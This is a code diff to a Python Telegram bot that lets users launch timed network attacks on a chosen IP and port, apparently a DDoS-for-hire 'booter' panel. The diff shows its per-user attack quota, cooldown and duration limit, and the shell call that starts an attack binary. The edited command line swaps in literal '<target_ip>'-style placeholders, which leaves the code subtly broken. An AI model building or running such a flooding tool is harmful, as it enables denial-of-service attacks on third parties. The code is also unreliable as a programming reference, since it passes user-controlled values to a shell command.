@@ -118,12 +118,8 @@ def handle_attack(message):
         bot.reply_to(message, "⚠️ Attack duration cannot exceed 240 seconds.")
         return
 
-    # Set the cooldown immediately after validation
-    attack_data['last_used'] = now  # Set the cooldown here, before starting the attacl
-
-    
     # Execute the attack
-    full_command = f"./{binary} {target} {port} {time_duration} 900"
+    full_command = f"./{binary} <target_ip> <target_port> <duration>"
     try:
         bot.reply_to(
             message,
@@ -133,14 +129,17 @@ def handle_attack(message):
             f"⏱ **Duration:** `{time_duration} seconds`\n"
             f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
         )
-    subprocess.run(full_command, shell=True, check=True)  # Added check=True to raise exceptions on errors
-    bot.reply_to(message, f"✅ **Attack Completed Successfully!**")
-except subprocess.CalledProcessError as e:
-    bot.reply_to(message, f"❌ Execution Error: {e}")
+        subprocess.run(full_command, shell=True)
+        bot.reply_to(message, f"✅ **Attack Completed Successfully!**")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Execution Error: {str(e)}")
+        return
 
-    # Update user data
+    # Update cooldown and user data
+    attack_data['last_used'] = now
     user['attacks'] += 1
     save_users()
+
 # Command to check remaining attacks
 @bot.message_handler(commands=['remaining'])
 def remaining_attacks(message):
@@ -253,3 +252,4 @@ while True:
     except Exception as e:
         print(e)
         time.sleep(15)
+        
